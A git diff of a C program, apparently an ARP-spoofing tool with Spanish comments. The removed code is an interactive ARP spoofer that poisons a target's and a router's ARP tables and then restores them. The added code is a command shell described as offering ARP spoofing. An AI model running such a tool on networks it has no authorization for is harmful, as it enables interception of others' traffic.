@@ -1,100 +1,117 @@
-#include <arpa/inet.h>
-#include <net/if.h>
-#include <stdint.h>
+/*
+ * Este comando tiene como objetivo principal
+ * abstraer ciertas tareas en redes locales.
+ * Actualmente este permite hacer ARP Spoofing
+ * en su red local.
+ * (C) Lenx443 2024-2025
+ */
+
+// Mensaje de error para dispositivo Wundiws.
+#if defined(__WIN32) || defined(__WIN64)
+#warning "Este programa no es compatible aun con su dispositivo"
+#warning "Para mas informacion puede ir a https://github.com/lenx443"
+#error "Dispositivo no compatible"
+#endif
+
+#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
 
-#include "functions.h"
-#include "handle_sniff.h"
+#include "colors.h"
+#include "commands.h"
+#include "config.h"
+#include "errs.h"
+#include "list.h"
+#include "program.h"
 
-int main() {
-  char *c1 = color(4);
-  char *c2 = color(2);
-  char *c3 = color(3);
-  char *c4 = color(0);
-  char *c5 = color(5);
-  char *c6 = color(1);
-  char *bg = background(6);
+#define push_back(list, value, size)                                           \
+  if (!list_push_back(list, value, size))                                      \
+    return -1;
 
-  char iface[IFNAMSIZ];
-  char text_target_ip[16];
-  char text_router_ip[16];
-  uint32_t target_ip;
-  uint32_t router_ip;
-  printf("%sARP Spoofer (C) 2024 X-Leamsi%s\n\n", c1, color_reset);
-  printf("[%sIface%s]: ", c2, color_reset);
-  scanf("%15s", iface);
-  printf("[%sTarget IP%s]: ", c2, color_reset);
-  scanf("%15s", text_target_ip);
-  printf("[%sRouter IP%s]: ", c2, color_reset);
-  scanf("%15s", text_router_ip);
+#define push_string(list, string)                                              \
+  if (!list_push_back_string_node(list, string))                               \
+    return 0;
 
-  struct in_addr addr;
-  memset(&addr, 0x00, sizeof(addr));
-  if (!inet_aton(text_target_ip, &addr)) {
-    printf("[%sError en el inet_aton%s]: Error al convertir la direccion IP\n",
-           color(2), color_reset);
-    return EXIT_FAILURE;
+int main(int argc, char **argv) {
+  signal(SIGINT, no_signal);
+
+  // Aqui se inicializan las
+  // propiedades de la shell.
+  config = config_new();
+  if (config == NULL) {
+    print_error(argv[0], "No se pudo iniciar la configuracion");
+    return 1;
   }
-  target_ip = addr.s_addr;
-  memset(&addr, 0x00, sizeof(addr));
-  if (!inet_aton(text_router_ip, &addr)) {
-    printf("[%sError en el inet_aton%s]: Error al convertir la direccion IP\n",
-           color(2), color_reset);
-    return EXIT_FAILURE;
+  printf(AZUL "NetXenium" RESET " (C) " AMARILLO "Lenx443 2024-2025" RESET "\n"
+              "Type " VERDE "help" RESET " for more info\n");
+
+  /*
+   * Este es el bucle principa del proograma.
+   * donde se manejan los comandos y sus retornos
+   * (la shell).
+   */
+  int return_code = 0;
+  while (1) {
+    // Aqui se reciven y validan las entradas.
+    char cmd[1024];
+    printf("[%s%d" RESET "] " AMARILLO "%s" RESET " > ",
+           return_code == 0 ? VERDE : ROJO, return_code, argv[0]);
+    if (fgets(cmd, 1024, stdin) == NULL) {
+      putc('\n', stdout);
+      break;
+    }
+    cmd[strcspn(cmd, "\n")] = '\0';
+
+    // Se tokenisan los argumentos
+    LIST_ptr args = list_new();
+    char *token = strtok(cmd, " ");
+    while (token != NULL) {
+      push_string(args, token);
+      token = strtok(NULL, " ");
+    }
+    if (list_size(*args) == 0) {
+      list_free(args);
+      continue;
+    }
+
+    /*
+     * Se verific aque el comando este
+     * disponible y obtiene su retorno.
+     */
+    NODE_ptr cmd_node = list_index_get(0, *args);
+    if (cmd_node == NULL) {
+      list_free(args);
+      continue;
+    }
+    char *cmd_str = (char *)cmd_node->point;
+    int matched = 0;
+    for (int i = 0; cmds[i] != NULL; i++) {
+      if (strcmp(cmds[i]->name, cmd_str) == 0) {
+        return_code = cmds[i]->func(args);
+        matched = 1;
+      }
+    }
+    if (!matched) {
+      printf("Not Command matched: " ROJO "%s" RESET "\n", cmd_str);
+      return_code = EXIT_FAILURE;
+    }
+
+    /*
+     * Si algun comando solicita
+     * terminar la shell se para el
+     * bucle.
+     */
+    if (program.closed)
+      break;
+    list_free(args);
   }
-  router_ip = addr.s_addr;
 
-  uint32_t local_ip;
-  if (!get_local_ip(&local_ip, iface))
-    return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6),
-            free(bg), EXIT_FAILURE);
-  uint8_t local_mac[6];
-  if (!get_local_mac(local_mac, iface))
-    return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6),
-            free(bg), EXIT_FAILURE);
-
-  printf(
-      "\n\n(%s***%s) %sInicinado Ataque de Susplantacion de las tablas ARP%s\n",
-      c1, color_reset, c3, color_reset);
-
-  printf("\n(%s***%s) IP de esta maquina: %s%s%s%s; MAC de esta maquina: "
-         "%s%s%s%s;\n",
-         c1, color_reset, bg, c4, inet_ntoa(*(struct in_addr *)&local_ip),
-         color_reset, bg, c4, mac_to_text(local_mac), color_reset);
-
-  printf("\n(%s***%s) IP del Objetivo: %s%s%s%s; IP del Router: %s%s%s%s; "
-         "Interfaz de Red: %s%s%s%s;\n",
-         c1, color_reset, bg, c4, text_target_ip, color_reset, bg, c4,
-         text_router_ip, color_reset, bg, c4, iface, color_reset);
-
-  uint8_t target_mac[6];
-  if (!get_mac(target_mac, local_mac, local_ip, target_ip, iface))
-    return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6),
-            free(bg), EXIT_FAILURE);
-  uint8_t router_mac[6];
-  if (!get_mac(router_mac, local_mac, local_ip, router_ip, iface))
-    return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6),
-            free(bg), EXIT_FAILURE);
-
-  printf("\n(%s***%s) MAC del Objetivo: %s%s%s%s; MAC del Router: %s%s%s%s;\n",
-         c1, color_reset, bg, c4, mac_to_text(target_mac), color_reset, bg, c4,
-         mac_to_text(router_mac), color_reset);
-
-  send_arp(local_mac, router_ip, target_mac, target_ip, iface);
-  send_arp(local_mac, target_ip, router_mac, router_ip, iface);
-
-  printf("\n\n(%s***%s) %sSusplantacion ARP iniciada%s\n", c5, color_reset, c6,
-         color_reset);
-
-  printf("Use [CTRL + C] para terminar ataque\n");
-  while (1)
-    wait_handle(iface, target_ip, target_mac, router_ip, router_mac);
-
-  send_arp(router_mac, router_ip, target_mac, target_ip, iface);
-  send_arp(target_mac, target_ip, router_mac, router_ip, iface);
-  printf("\n(%s***%s) %sAtaque tarminado%s\n", c5, color_reset, c2,
-         color_reset);
-  return (free(c1), free(c2), free(c3), free(c4), free(c5), free(c6), free(bg),
-          EXIT_SUCCESS);
+  /*
+   * Al finalizar el bucle se libera
+   * la memoria.
+   */
+  config_free(config);
+  return 0;
 }
